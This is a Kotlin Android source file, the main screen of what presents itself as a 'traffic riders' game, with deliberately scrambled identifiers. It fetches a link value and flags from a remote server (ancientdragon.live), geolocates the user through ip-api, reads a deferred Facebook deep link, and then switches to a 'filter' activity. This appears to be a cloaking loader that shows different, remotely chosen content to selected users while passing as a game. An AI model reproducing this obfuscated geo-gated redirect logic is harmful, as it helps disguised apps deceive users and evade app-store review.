package com.skgames.trafficriders

import android.content.Context
import com.skgames.trafficriders.ooother.AppliccationClso.Companion.countryCodefrrfrfrfrrf
import com.skgames.trafficriders.ooother.AppliccationClso.Companion.geomeogtgt
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import com.skgames.trafficriders.databinding.ActivityMainBinding
import com.skgames.trafficriders.elemennnts.SsssserviceApi
import com.skgames.trafficriders.ooother.AppliccationClso
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.skgames.trafficriders.acttiv222.FirFiiilterActivity



class MainActivity : AppCompatActivity() {

    val urriiii = "http://ancientdragon.live/"
    val urriiii22222 = "http://pro.ip-api.com/"

    private lateinit var mainBinding: ActivityMainBinding

    fun bbnnyhhygtgtfrrf(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val gbggbgbjjjj = appLinkData.targetUri.host.toString()
                Hawk.put(AppliccationClso.DEEPLfrfrfrfr, gbggbgbjjjj)
            }
            if (appLinkData == null) {
            }
        }
    }

    private suspend fun hyhy() {

        val ssssserviceApi = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl(urriiii)
            .build()
            .create(SsssserviceApi::class.java)
        val value = ssssserviceApi.getDataDev().body()?.kiikikik.toString()
        val juujujujujuj = ssssserviceApi.getDataDev().body()?.bggbbgnhnhhn.toString()
        val ikkiloolooo = ssssserviceApi.getDataDev().body()?.hhhjjj.toString()




        Hawk.put(AppliccationClso.linkfrrrfrffr, value)
        Hawk.put(AppliccationClso.appsCheckfrr6, juujujujujuj)
        Hawk.put(AppliccationClso.geomeogtgt, ikkiloolooo)

    }

    private suspend fun hyhygfffff() {
        val xcxxccxxc = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl(urriiii22222)
            .build()
            .create(SsssserviceApi::class.java)
        val frfrrfr = xcxxccxxc.getData().body()?.codefgtgt56556

        Hawk.put(countryCodefrrfrfrfrrf, frfrrfr)
    }


    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        mainBinding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(mainBinding.root)

        bbnnyhhygtgtfrrf(this)

        val scheduledExecutorService = Executors.newSingleThreadScheduledExecutor()
        var gththyhyhyhy: String? = Hawk.get(countryCodefrrfrfrfrrf, null)
        var frrfddddvv: String? = Hawk.get(geomeogtgt, null)
        scheduledExecutorService.scheduleAtFixedRate({
            if (gththyhyhyhy != null && frrfddddvv != null) {
                scheduledExecutorService.shutdown()
                hyjjuujujuj()
            } else {
                gththyhyhyhy = Hawk.get(countryCodefrrfrfrfrrf)
                frrfddddvv = Hawk.get(geomeogtgt)
            }
        }, 0, 1, TimeUnit.SECONDS)

        GlobalScope.launch(Dispatchers.IO) {
            kiikikkilo
        }
    }


    private val kiikikkilo: Job = GlobalScope.launch(Dispatchers.IO) {
        hyhygfffff()
        hyhy()
    }

    private fun hyjjuujujuj() {
        val intent = Intent(this@MainActivity, FirFiiilterActivity::class.java)
        startActivity(intent)
        finish()
    }


}